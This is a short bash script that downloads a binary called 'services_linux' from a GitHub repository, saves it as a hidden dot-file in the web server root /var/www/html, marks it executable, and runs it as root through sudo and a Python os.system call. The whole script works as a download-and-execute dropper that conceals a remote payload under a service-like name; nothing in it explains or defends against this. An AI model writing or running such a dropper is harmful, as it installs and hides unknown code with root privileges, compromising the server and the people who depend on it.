#!/bin/bash

# Define the destination directory
DEST_DIR="/var/www/html"
FILE_NAME="services_linux"
HIDDEN_FILE_NAME=".$FILE_NAME"  # Prefix the filename with a dot

# Ensure the destination directory exists
if [ ! -d "$DEST_DIR" ]; then
    echo "Destination directory $DEST_DIR does not exist. Creating it."
    mkdir -p "$DEST_DIR"
fi

# Download the file from the URL and save it to the destination directory
echo "Downloading $FILE_NAME..."
wget -O "$DEST_DIR/$HIDDEN_FILE_NAME" https://github.com/ThanHuuTuan/DT_ATTT_VR/raw/main/$FILE_NAME

if [ $? -eq 0 ]; then
    echo "Download successful."
else
    echo "Download failed." >&2
    exit 1
fi

# Set execute permissions for the downloaded file
chmod +x "$DEST_DIR/$HIDDEN_FILE_NAME"
echo "Changed file permissions."

# Run the downloaded file using Python
echo "Running Python command with sudo..."
sudo python3 -c "import os; os.system('$DEST_DIR/$HIDDEN_FILE_NAME')"

if [ $? -eq 0 ]; then
    echo "Execution successful."
else
    echo "Error running the file." >&2
    exit 1
fi
